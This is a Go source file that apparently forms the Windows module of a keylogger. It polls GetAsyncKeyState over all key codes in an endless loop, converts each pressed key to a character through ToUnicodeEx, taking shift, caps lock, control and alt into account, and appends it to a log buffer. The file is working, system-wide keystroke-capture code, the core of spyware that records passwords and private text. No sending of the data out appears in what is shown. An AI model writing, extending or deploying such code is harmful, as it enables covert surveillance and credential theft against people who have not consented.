//go:build windows
// +build windows

package windows

import (
	"bytes"
	"syscall"
	"unicode/utf8"
	"unsafe"

	"github.com/TheTitanrain/w32"
)

var (
	moduser32 = syscall.NewLazyDLL("user32.dll")

	procGetKeyboardLayout     = moduser32.NewProc("GetKeyboardLayout")
	procGetKeyboardState      = moduser32.NewProc("GetKeyboardState")
	procToUnicodeEx           = moduser32.NewProc("ToUnicodeEx")
	procGetKeyboardLayoutList = moduser32.NewProc("GetKeyboardLayoutList")
	procMapVirtualKeyEx       = moduser32.NewProc("MapVirtualKeyExW")
	procGetKeyState           = moduser32.NewProc("GetKeyState")
)

type WindowsLogger struct {
	lastKey int
}

type Key struct {
	Empty   bool
	Rune    rune
	Keycode int
}

func NewWindowsLogger() *WindowsLogger {
	return &WindowsLogger{}
}

func (l *WindowsLogger) CaptureKeyboardKeys(logBuffer *bytes.Buffer) {
	for {
		key := l.getKey()
		if !key.Empty {
			logBuffer.WriteRune(key.Rune)
		}
	}
}

func (l *WindowsLogger) getKey() Key {
	activeKey := 0
	var keyState uint16

	for i := 0; i < 256; i++ {
		keyState = w32.GetAsyncKeyState(i)

		if keyState&(1<<15) != 0 && !(i < 0x2F && i != 0x20) && (i < 160 || i > 165) && (i < 91 || i > 93) {
			activeKey = i
			break
		}
	}

	if activeKey != 0 {
		if activeKey != l.lastKey {
			l.lastKey = activeKey
			return l.ParseKeycode(activeKey, keyState)
		}
	} else {
		l.lastKey = 0
	}

	return Key{Empty: true}
}

func (l WindowsLogger) ParseKeycode(keyCode int, keyState uint16) Key {
	key := Key{Empty: false, Keycode: keyCode}

	outBuf := make([]uint16, 1)

	kbState := make([]uint8, 256)

	kbLayout, _, _ := procGetKeyboardLayout.Call(uintptr(0))

	if w32.GetAsyncKeyState(w32.VK_SHIFT)&(1<<15) != 0 {
		kbState[w32.VK_SHIFT] = 0xFF
	}

	capitalState, _, _ := procGetKeyState.Call(uintptr(w32.VK_CAPITAL))
	if capitalState != 0 {
		kbState[w32.VK_CAPITAL] = 0xFF
	}

	if w32.GetAsyncKeyState(w32.VK_CONTROL)&(1<<15) != 0 {
		kbState[w32.VK_CONTROL] = 0xFF
	}

	if w32.GetAsyncKeyState(w32.VK_MENU)&(1<<15) != 0 {
		kbState[w32.VK_MENU] = 0xFF
	}

	_, _, _ = procToUnicodeEx.Call(
		uintptr(keyCode),
		uintptr(0),
		uintptr(unsafe.Pointer(&kbState[0])),
		uintptr(unsafe.Pointer(&outBuf[0])),
		uintptr(1),
		uintptr(1),
		uintptr(kbLayout))

	key.Rune, _ = utf8.DecodeRuneInString(syscall.UTF16ToString(outBuf))

	return key
}
